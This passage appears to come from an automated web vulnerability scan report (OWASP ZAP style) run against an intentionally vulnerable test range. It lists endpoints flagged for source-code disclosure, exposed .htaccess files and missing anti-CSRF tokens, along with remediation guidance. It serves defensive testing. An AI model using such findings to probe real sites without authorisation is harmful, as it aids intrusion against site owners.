  * Other Info: `The output for the source code filename [attribute_unquoted] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [62%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/body%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `body`
  * Evidence: ``
  * Other Info: `The output for the source code filename [body] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [56%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/body_comment%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `body_comment`
  * Evidence: ``
  * Other Info: `The output for the source code filename [body_comment] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [60%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/css_style%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `css_style`
  * Evidence: ``
  * Other Info: `The output for the source code filename [css_style] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [69%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/head%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `head`
  * Evidence: ``
  * Other Info: `The output for the source code filename [head] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [67%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_assignment%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `js_assignment`
  * Evidence: ``
  * Other Info: `The output for the source code filename [js_assignment] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [68%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_eval%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `js_eval`
  * Evidence: ``
  * Other Info: `The output for the source code filename [js_eval] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [66%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_quoted_string%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `js_quoted_string`
  * Evidence: ``
  * Other Info: `The output for the source code filename [js_quoted_string] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [67%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_singlequoted_string%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `js_singlequoted_string`
  * Evidence: ``
  * Other Info: `The output for the source code filename [js_singlequoted_string] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [64%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_slashquoted_string%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `js_slashquoted_string`
  * Evidence: ``
  * Other Info: `The output for the source code filename [js_slashquoted_string] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [65%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/tagname%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `tagname`
  * Evidence: ``
  * Other Info: `The output for the source code filename [tagname] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [56%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/textarea%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `textarea`
  * Evidence: ``
  * Other Info: `The output for the source code filename [textarea] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [70%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/flashinjection/callbackIsEchoedBack%3Fcallback=func
  * Method: `GET`
  * Parameter: `callback`
  * Attack: `callbackIsEchoedBack`
  * Evidence: ``
  * Other Info: `The output for the source code filename [callbackIsEchoedBack] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [12%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/contentsniffing/json%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `json`
  * Evidence: ``
  * Other Info: `The output for the source code filename [json] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [38%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/contentsniffing/plaintext%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `plaintext`
  * Evidence: ``
  * Other Info: `The output for the source code filename [plaintext] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [36%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_quoted/DOUBLE_QUOTED_ATTRIBUTE%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `DOUBLE_QUOTED_ATTRIBUTE`
  * Evidence: ``
  * Other Info: `The output for the source code filename [DOUBLE_QUOTED_ATTRIBUTE] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [64%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_singlequoted/SINGLE_QUOTED_ATTRIBUTE%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `SINGLE_QUOTED_ATTRIBUTE`
  * Evidence: ``
  * Other Info: `The output for the source code filename [SINGLE_QUOTED_ATTRIBUTE] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [64%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_unquoted/UNQUOTED_ATTRIBUTE%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `UNQUOTED_ATTRIBUTE`
  * Evidence: ``
  * Other Info: `The output for the source code filename [UNQUOTED_ATTRIBUTE] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [65%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/filteredcharsets/attribute_unquoted/DoubleQuoteSinglequote%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `DoubleQuoteSinglequote`
  * Evidence: ``
  * Other Info: `The output for the source code filename [DoubleQuoteSinglequote] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [59%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/filteredcharsets/body/SpaceDoubleQuoteSlashEquals%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `SpaceDoubleQuoteSlashEquals`
  * Evidence: ``
  * Other Info: `The output for the source code filename [SpaceDoubleQuoteSlashEquals] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [45%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseInsensitive/script%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `script`
  * Evidence: ``
  * Other Info: `The output for the source code filename [script] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [7%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/SCRIPT%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `SCRIPT`
  * Evidence: ``
  * Other Info: `The output for the source code filename [SCRIPT] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [7%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/script%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `script`
  * Evidence: ``
  * Other Info: `The output for the source code filename [script] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [7%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_name%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `attribute_name`
  * Evidence: ``
  * Other Info: `The output for the source code filename [attribute_name] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [59%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_quoted%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `attribute_quoted`
  * Evidence: ``
  * Other Info: `The output for the source code filename [attribute_quoted] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [64%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_singlequoted%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `attribute_singlequoted`
  * Evidence: ``
  * Other Info: `The output for the source code filename [attribute_singlequoted] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [61%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_unquoted%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `attribute_unquoted`
  * Evidence: ``
  * Other Info: `The output for the source code filename [attribute_unquoted] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [62%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/body/400%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `400`
  * Evidence: ``
  * Other Info: `The output for the source code filename [400] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [56%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/body/401%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `401`
  * Evidence: ``
  * Other Info: `The output for the source code filename [401] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [56%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/body/403%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `403`
  * Evidence: ``
  * Other Info: `The output for the source code filename [403] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [56%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/body/404%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `404`
  * Evidence: ``
  * Other Info: `The output for the source code filename [404] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [56%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/body/500%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `500`
  * Evidence: ``
  * Other Info: `The output for the source code filename [500] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [56%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/body%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `body`
  * Evidence: ``
  * Other Info: `The output for the source code filename [body] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [56%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/body_comment%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `body_comment`
  * Evidence: ``
  * Other Info: `The output for the source code filename [body_comment] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [60%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/css_style%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `css_style`
  * Evidence: ``
  * Other Info: `The output for the source code filename [css_style] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [69%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/head%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `head`
  * Evidence: ``
  * Other Info: `The output for the source code filename [head] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [67%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_assignment%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `js_assignment`
  * Evidence: ``
  * Other Info: `The output for the source code filename [js_assignment] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [68%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_eval%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `js_eval`
  * Evidence: ``
  * Other Info: `The output for the source code filename [js_eval] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [70%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_quoted_string%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `js_quoted_string`
  * Evidence: ``
  * Other Info: `The output for the source code filename [js_quoted_string] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [67%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_singlequoted_string%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `js_singlequoted_string`
  * Evidence: ``
  * Other Info: `The output for the source code filename [js_singlequoted_string] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [64%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_slashquoted_string%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `js_slashquoted_string`
  * Evidence: ``
  * Other Info: `The output for the source code filename [js_slashquoted_string] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [65%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/json%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `json`
  * Evidence: ``
  * Other Info: `The output for the source code filename [json] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [38%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/noscript%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `noscript`
  * Evidence: ``
  * Other Info: `The output for the source code filename [noscript] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [69%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/style_attribute_value%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `style_attribute_value`
  * Evidence: ``
  * Other Info: `The output for the source code filename [style_attribute_value] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [65%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/tagname%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `tagname`
  * Evidence: ``
  * Other Info: `The output for the source code filename [tagname] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [56%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/textarea%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `textarea`
  * Evidence: ``
  * Other Info: `The output for the source code filename [textarea] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [70%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/textarea_attribute_value%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `textarea_attribute_value`
  * Evidence: ``
  * Other Info: `The output for the source code filename [textarea_attribute_value] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [69%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/parameter/title%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `title`
  * Evidence: ``
  * Other Info: `The output for the source code filename [title] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [71%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/url/href%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `href`
  * Evidence: ``
  * Other Info: `The output for the source code filename [href] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [70%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reflected/url/script_src%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `script_src`
  * Evidence: ``
  * Other Info: `The output for the source code filename [script_src] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [68%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/jsonpendpoint%3Fcallback=urc_button.click&q
  * Method: `GET`
  * Parameter: `callback`
  * Attack: `jsonpendpoint`
  * Evidence: ``
  * Other Info: `The output for the source code filename [jsonpendpoint] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [46%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/tags/multiline%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `multiline`
  * Evidence: ``
  * Other Info: `The output for the source code filename [multiline] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [49%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/urldom/jsonp%3Fcallback=foobar
  * Method: `GET`
  * Parameter: `callback`
  * Attack: `jsonp`
  * Evidence: ``
  * Other Info: `The output for the source code filename [jsonp] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [54%], compared to a threshold of [75%]`

Instances: 71

### Solution

Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."

For filenames, use stringent allow lists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses, and exclude directory separators such as "/". Use an allow list of allowable file extensions.

Warning: if you attempt to cleanse your data, then do so that the end result is not in the form that can be dangerous. A sanitizing mechanism can remove characters such as '.' and ';' which may be required for some exploits. An attacker can try to fool the sanitizing mechanism into "cleaning" data into a dangerous form. Suppose the attacker injects a '.' inside a filename (e.g. "sensi.tiveFile") and the sanitizing mechanism removes the character resulting in the valid filename, "sensitiveFile". If the input data are now assumed to be safe, then the file may be compromised. 

Inputs should be decoded and canonicalized to the application's current internal representation before being validated. Make sure that your application does not decode the same input twice. Such errors could be used to bypass allow list schemes by introducing dangerous inputs after they have been checked.

Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links.

Run your code using the lowest privileges that are required to accomplish the necessary tasks. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.

When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.

Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by your software.

OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows you to specify restrictions on file operations.

This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.


### Reference


* [ https://owasp.org/www-community/attacks/Path_Traversal ](https://owasp.org/www-community/attacks/Path_Traversal)
* [ https://cwe.mitre.org/data/definitions/22.html ](https://cwe.mitre.org/data/definitions/22.html)


#### CWE Id: [ 541 ](https://cwe.mitre.org/data/definitions/541.html)


#### WASC Id: 33

#### Source ID: 1

### [ .htaccess Information Leak ](https://www.zaproxy.org/docs/alerts/40032/)



##### Medium (Medium)

### Description

htaccess files can be used to alter the configuration of the Apache Web Server software to enable/disable additional functionality and features that the Apache Web Server software has to offer. 

* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/array/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 200 OK`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/function/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 200 OK`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/property/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 200 OK`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/array/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 200 OK`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/function/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 200 OK`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/property/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 200 OK`
  * Other Info: ``

Instances: 6

### Solution

Ensure the .htaccess file is not accessible.

### Reference


* [ https://developer.mozilla.org/en-US/docs/Learn/Server-side/Apache_Configuration_htaccess ](https://developer.mozilla.org/en-US/docs/Learn/Server-side/Apache_Configuration_htaccess)
* [ https://httpd.apache.org/docs/2.4/howto/htaccess.html ](https://httpd.apache.org/docs/2.4/howto/htaccess.html)


#### CWE Id: [ 94 ](https://cwe.mitre.org/data/definitions/94.html)


#### WASC Id: 14

#### Source ID: 1

### [ Absence of Anti-CSRF Tokens ](https://www.zaproxy.org/docs/alerts/10202/)



##### Medium (Low)

### Description

No Anti-CSRF tokens were found in a HTML submission form.
A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user. By contrast, cross-site scripting (XSS) exploits the trust that a user has for a web site. Like XSS, CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.

CSRF attacks are effective in a number of situations, including:
    * The victim has an active session on the target site.
    * The victim is authenticated via HTTP auth on the target site.
    * The victim is on the same local network as the target site.

CSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.

* URL: https://public-firing-range.appspot.com/angular/angular_body_raw_post/1.6.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<form action="" method="post">`
  * Other Info: `No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token] was found in the following HTML form: [Form 1: "q" ].`
* URL: https://public-firing-range.appspot.com/reflected/parameter/form
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<form method="POST">`
  * Other Info: `No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token] was found in the following HTML form: [Form 1: "q" ].`
* URL: https://public-firing-range.appspot.com/angular/angular_body_raw_post/1.6.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<form action="" method="post">`
  * Other Info: `No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token] was found in the following HTML form: [Form 1: "q" ].`
* URL: https://public-firing-range.appspot.com/reflected/parameter/form
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<form method="POST">`
  * Other Info: `No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token] was found in the following HTML form: [Form 1: "q" ].`

Instances: 4

### Solution

Phase: Architecture and Design
Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
For example, use anti-CSRF packages such as the OWASP CSRFGuard.

Phase: Implementation
Ensure that your application is free of cross-site scripting issues, because most CSRF defenses can be bypassed using attacker-controlled script.

Phase: Architecture and Design
Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330).
Note that this can be bypassed using XSS.

Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.
Note that this can be bypassed using XSS.

Use the ESAPI Session Management control.
This control includes a component for CSRF.

Do not use the GET method for any request that triggers a state change.

Phase: Implementation
Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html ](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
* [ https://cwe.mitre.org/data/definitions/352.html ](https://cwe.mitre.org/data/definitions/352.html)


#### CWE Id: [ 352 ](https://cwe.mitre.org/data/definitions/352.html)


#### WASC Id: 9

#### Source ID: 3

### [ Anti-CSRF Tokens Check ](https://www.zaproxy.org/docs/alerts/20012/)



##### Medium (Medium)

### Description

A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user. By contrast, cross-site scripting (XSS) exploits the trust that a user has for a web site. Like XSS, CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.

CSRF attacks are effective in a number of situations, including:
    * The victim has an active session on the target site.
    * The victim is authenticated via HTTP auth on the target site.
    * The victim is on the same local network as the target site.

CSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.

* URL: https://public-firing-range.appspot.com/angular/angular_body_raw_post/1.6.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<form action="" method="post">`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/angular_form_parse/1.6.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<form ng-app="test" ng-submit="submit()" ng-controller="VulnerableController">`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/form
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<form method="POST">`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/angular_body_raw_post/1.6.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<form action="" method="post">`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/form
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<form method="POST">`
  * Other Info: ``

Instances: 5

### Solution

Phase: Architecture and Design
Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
For example, use anti-CSRF packages such as the OWASP CSRFGuard.

Phase: Implementation
Ensure that your application is free of cross-site scripting issues, because most CSRF defenses can be bypassed using attacker-controlled script.

Phase: Architecture and Design
Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330).
Note that this can be bypassed using XSS.

Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.
Note that this can be bypassed using XSS.

Use the ESAPI Session Management control.
This control includes a component for CSRF.

